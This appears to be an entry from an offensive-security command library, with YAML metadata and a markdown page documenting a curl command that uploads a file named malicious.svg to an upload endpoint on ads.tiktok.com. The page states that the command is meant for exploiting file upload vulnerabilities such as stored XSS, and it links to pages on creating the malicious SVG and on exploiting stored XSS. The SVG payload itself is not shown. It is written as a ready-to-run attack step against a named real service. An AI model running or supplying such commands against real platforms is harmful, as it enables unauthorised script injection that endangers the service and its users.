---
data: >-
  curl -X POST https://ads.tiktok.com/upload -F 'file=@malicious.svg' -H
  'Authorization: Bearer YOUR_TOKEN'
tags:
  - upload
  - xss
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 15001037-271a-4e0f-b0a5-5d69d7fc4b42
created_at: '2025-12-13T23:56:20.148Z'
updated_at: '2025-12-13T23:56:20.148Z'
verified: false
validated: true
submitted: true
---
# upload-svg-file

## Command

```bash
curl -X POST https://ads.tiktok.com/upload -F 'file=@malicious.svg' -H 'Authorization: Bearer YOUR_TOKEN'
```

## Description

This command uploads an SVG file to a web endpoint using curl, suitable for exploiting file upload vulnerabilities like stored XSS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `URL` | Target upload endpoint | Yes |
| `-F 'file=@malicious.svg'` | File to upload | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN'` | Authentication header | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://ads.tiktok.com/upload -F 'file=@malicious.svg' -H 'Authorization: Bearer YOUR_TOKEN'
```

### Advanced Usage

```bash
curl -X POST https://ads.tiktok.com/upload -F 'file=@malicious.svg' -F 'param=value' -H 'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: multipart/form-data'
```

## Expected Output

HTTP response indicating successful upload, such as 200 OK with confirmation message.

## Related

- [[commands/create-malicious-svg]]
- [[procedures/Exploit-Stored-XSS-via-SVG-Upload]]
